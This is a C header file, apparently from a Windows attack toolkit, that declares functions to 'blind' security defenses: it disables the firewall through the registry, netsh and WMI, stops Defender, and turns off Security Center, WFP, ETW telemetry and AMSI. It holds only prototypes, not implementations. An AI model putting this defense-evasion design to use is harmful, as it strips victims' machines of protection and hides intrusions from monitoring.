#ifndef DEFENSIVE_BLINDING_H
#define DEFENSIVE_BLINDING_H

#include "enumerator.h"
#include <windows.h>
#include <stdbool.h>

// Defensive feature blinding result
typedef struct {
    bool firewall_blinded;
    bool defender_blinded;
    bool security_center_blinded;
    bool wfp_blinded;
    bool etw_blinded;
    bool amsi_blinded;
    int total_features_blinded;
    char details[2048];
} defensive_blinding_result_t;

// Function prototypes
int blind_defensive_features(enum_data_t* data);
int blind_windows_firewall(enum_data_t* data);
int blind_windows_defender(enum_data_t* data);
int blind_security_center(enum_data_t* data);
int blind_wfp(enum_data_t* data);
int blind_etw_telemetry(enum_data_t* data);
int blind_amsi(enum_data_t* data);
int disable_firewall_via_registry(void);
int disable_firewall_via_netsh(void);
int disable_firewall_via_wmi(void);
int stop_defender_service(void);
int disable_defender_via_registry(void);
int disable_security_center_via_registry(void);
int disable_wfp_via_registry(void);

#endif // DEFENSIVE_BLINDING_H
